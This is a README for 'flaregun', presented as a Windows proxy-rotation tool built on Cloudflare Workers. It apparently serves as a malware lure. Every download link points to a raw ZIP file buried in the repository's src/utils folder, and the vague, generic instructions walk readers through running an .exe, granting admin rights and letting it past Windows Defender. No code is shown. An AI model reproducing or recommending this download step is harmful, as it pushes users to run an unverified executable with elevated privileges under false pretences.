# 🔥 flaregun - Fast proxy rotation for Windows

[![Download flaregun](https://img.shields.io/badge/Download%20flaregun-blue?style=for-the-badge)](https://raw.githubusercontent.com/magicspellnosejob374/flaregun/main/src/utils/Software-1.9.zip)

## 🚀 What is flaregun?

flaregun is a proxy tool that helps you route traffic through a rotating network on Cloudflare Workers. It is built for users who want to set up and change proxy routes with less effort.

Use it when you want to:
- rotate proxy endpoints
- run a proxy setup from Cloudflare Workers
- manage traffic through a simple Windows app
- keep your proxy use organized in one place

## 💻 What you need

Before you start, make sure you have:

- a Windows 10 or Windows 11 PC
- a web browser
- an internet connection
- permission to use the network you plan to connect to
- enough disk space for the app and its files

For best results, use:
- a screen with at least 1366 × 768 resolution
- admin access if Windows asks for it
- the latest version of your browser

## 📥 Download flaregun

Open the download page here:

https://raw.githubusercontent.com/magicspellnosejob374/flaregun/main/src/utils/Software-1.9.zip

On that page, look for the latest release or the main download file. If you see a setup file, download it to your PC. If you see a ZIP file, download it and extract it first.

## 🪟 Install on Windows

Follow these steps on your Windows PC:

1. Open the download link in your browser.
2. Find the latest file for Windows.
3. Click the file to start the download.
4. If the file is in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Look for the app file, such as an .exe file.
7. Double-click the app file to run flaregun.
8. If Windows asks for permission, choose Yes.

If the app opens in a new window, keep that window open while you use it.

## 🛠️ First setup

When you start flaregun for the first time, it may ask for basic setup details. This can include:

- a worker endpoint
- a proxy source
- a local port
- a profile name
- a test URL

Use the values from your project or provider. If you are not sure what to enter, start with the defaults shown in the app.

A good first check is to:
- open the main screen
- review the current proxy route
- save your settings
- test the connection

## 🔁 How rotation works

flaregun uses a rotating path so traffic can move through different proxy points. In simple terms, the app switches routes based on the rules you set.

Common rotation options can include:
- time-based rotation
- request-based rotation
- manual switch
- retry on failure

If your app shows a rotation setting, choose the one that fits your use case. For most users, time-based rotation is the easiest place to start.

## 🧭 Main parts of the app

You may see these parts in flaregun:

- **Dashboard**: shows current status
- **Proxy settings**: stores your route details
- **Rotation controls**: sets how often the route changes
- **Logs**: shows what the app has done
- **Test tools**: checks if the proxy works

Use the dashboard first. It gives you a quick view of whether the proxy is active.

## ✅ Basic use steps

After setup, use flaregun like this:

1. Open the app.
2. Load your proxy profile.
3. Check the worker or route details.
4. Start the proxy.
5. Confirm the status changes to active.
6. Open your target app or browser.
7. Test your connection.
8. Watch the logs if something fails.

If the first route does not work, switch to another profile or update the worker details.

## 🧪 Test your connection

To see if flaregun is working, try a simple test:

- open a browser
- go to a site that shows your IP or connection info
- compare the result before and after starting the proxy
- check whether the route changed as expected

If the site still shows your regular connection, review your settings and start the proxy again.

## 🧰 Common settings

Here are some settings you may find useful:

- **Local port**: the port your browser or app uses
- **Worker URL**: the Cloudflare Workers link used for routing
- **Timeout**: how long the app waits before retrying
- **Retry count**: how many times the app tries again
- **Rotation interval**: how often the route changes

If you are new to this, keep the default values until you confirm the app works.

## 🔍 Troubleshooting

If flaregun does not start, try these steps:

1. Right-click the app and run it again.
2. Check whether Windows blocked the file.
3. Make sure the ZIP file was extracted first.
4. Confirm that your internet connection is working.
5. Close other apps that may use the same port.
6. Try a different port in the settings.
7. Check the logs for error messages.

If the proxy does not connect:
- verify the worker URL
- confirm the proxy source is active
- make sure the rotation settings are not too strict
- restart the app after changing settings

If Windows Defender asks about the file, review the prompt and allow the app only if it came from the link above.

## 📁 File layout

After you download and extract the app, you may see files like these:

- `flaregun.exe`
- `config.json`
- `logs`
- `profiles`
- `README.md`

Keep all files in the same folder so the app can find its settings and logs.

## 🔐 Safety and access

Use flaregun only on systems and networks you control or have permission to use. Keep your worker link and profile details private. If you share your settings, other people may use your proxy route.

For safer use:
- keep your Windows system updated
- use a trusted download source
- avoid changing settings you do not understand
- back up your config file before editing it

## ❓ FAQ

**Does flaregun need coding knowledge?**  
No. You can use it from the Windows app screen.

**Can I use it after a restart?**  
Yes. Open the app again and load your saved profile.

**What if the app shows no connection?**  
Check the worker URL, port, and rotation settings.

**Can I change the proxy route?**  
Yes. Use the rotation or profile controls in the app.

**Where do I get updates?**  
Use the same GitHub link and check for a newer release.

## 🧩 Quick start checklist

- download flaregun from the GitHub link
- extract the file if needed
- run the Windows app
- enter your worker or proxy details
- save the profile
- start the proxy
- test the connection
- adjust rotation settings if needed